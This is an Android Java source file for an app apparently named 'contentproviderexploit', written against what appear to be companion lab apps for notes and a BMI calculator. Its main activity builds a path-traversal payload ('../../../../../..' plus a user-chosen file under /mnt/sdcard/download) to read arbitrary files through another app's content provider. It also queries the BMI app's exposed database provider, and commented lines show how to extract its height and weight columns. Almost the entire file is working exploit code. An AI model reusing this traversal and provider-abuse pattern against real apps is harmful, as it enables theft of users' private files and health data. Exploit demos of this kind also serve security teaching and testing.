package tcs.lbs.contentproviderexploit;


import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

import android.content.ComponentName;
import android.content.ContentProviderClient;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import java.io.CharArrayWriter;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.Scanner;

public class MainActivity extends AppCompatActivity {
    EditText queryEditText;
    TextView resultTextView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        queryEditText = findViewById(R.id.query_editText);
        resultTextView = findViewById(R.id.resultTextView);
        queryEditText.setText("ExternalTextFile.txt");
    }

    public void queryContentProvider_onClicked(View view) throws IOException, RemoteException {
        // Get the content provider of Notes
        String URLcp = "content://" + "tcs.lbs.notes";
        Uri myUri = Uri.parse(URLcp);
        ContentProviderClient yourCR = getContentResolver().acquireContentProviderClient(myUri);

        Uri myUri2 = Uri.parse("content://" + "tcs.lbs.notes" + "/SharedFile.txt"); // Test for reading content of the file.

        // Payload
        myUri2 = Uri.parse("content://" + "tcs.lbs.notes/" + "../../../../../.." + "/mnt/sdcard/download/" + queryEditText.getText());

        //Read the text of the file
        ParcelFileDescriptor pfd = yourCR.openFile(myUri2, "r");
        InputStream fileStream = new FileInputStream(pfd.getFileDescriptor());
        java.util.Scanner s = new java.util.Scanner(fileStream).useDelimiter("\\A");
        String result = s.hasNext() ? s.next() : "";
        resultTextView.setText("Beginning of the content " + result);
    }

    public void accessContentProvider_onClicked(android.view.View view) {
        Intent intent = new Intent();
        intent.setData(Uri.parse("content://tcs.lbs.bmicalculator/database"));
        intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        intent.setClassName("tcs.lbs.bmicalculator", "tcs.lbs.bmicalculator.DataShareActivity");
        startActivityForResult(intent, 0);
    }

    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        //super.onActivityResult(requestCode, resultCode, data);

        // Use the below line if exploiting the Content Provider
        //Cursor cursor = getContentResolver().query(Uri.parse("content://tcs.lbs.bmicalculator/database"), null, null, null, null);
        // Use the below line if only accessing the BMI column (not exploiting)
        Cursor cursor = getContentResolver().query(Uri.parse("content://tcs.lbs.bmicalculator/bmi"), null, null, null, null);
        if (cursor.moveToFirst()) {
            StringBuilder strBuild = new StringBuilder();
            while (!cursor.isAfterLast()) {
                strBuild.append("\n"+
                        //cursor.getString(cursor.getColumnIndex("height")) + " - " + // Comment this line if only accessing BMI column (not exploiting)
                        //cursor.getString(cursor.getColumnIndex("weight")) + " - " + // Comment this line if only accessing BMI column (not exploiting)
                        cursor.getString(cursor.getColumnIndex("bmi")));
                cursor.moveToNext();
            }
            resultTextView.setText(strBuild);
        } else {
            resultTextView.setText("NONE FOUND");
        }
    }
}
